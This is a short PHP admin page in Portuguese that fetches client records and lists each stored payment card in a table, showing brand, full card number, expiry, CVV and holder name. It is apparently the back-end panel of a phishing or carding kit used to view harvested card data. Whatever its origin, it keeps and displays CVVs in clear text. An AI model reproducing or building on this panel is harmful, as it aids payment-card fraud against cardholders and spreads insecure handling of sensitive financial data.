<?php
include __DIR__.'/../../config/config.php';
include __DIR__.'/../../class/cliente.php';
$listar = new produtos;

$ok = $listar->cliente();
?>

<div class="content " >

<table class="table table-dark">
  <thead>
<tr>
      <th scope="row">#ID</th>
      <td>BANDEIRA</td>
      <td>CARD</td>
      <td>VALIDADE</td>
     
      <td>CVV</td>
      <td>TITULAR</td>
      
     
      
    
     
    </tr>

    
  </thead>
<tbody>


      <?php 
      foreach($ok as $cc):
        ?>
        <tr>
          <th scope="col"><?= $cc['id'] ?></th>
          
          
          <th scope="col"><?= $cc['bandeira'] ?></th>
         


       
          <th scope="col"><?= $cc['card'] ?></th>
          <th scope="col"><?= $cc['validade'] ?></th>
          <th scope="col"><?= $cc['cvv'] ?></th>
          <th scope="col"><?= $cc['nome'] ?> <?= $cc['sobrenome'] ?></th>
          
          
         


        </tr>

      <?php endforeach; ?>

    </tbody>
</table>




</div>







</form>
</div>
</div>
</div>
</div>


<script type="text/javascript">
  $(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })
</script>


</div>
</div>
</div>
</div>

</div>






</div>
</div>











</div>



</div>


</div>
</div>

</div>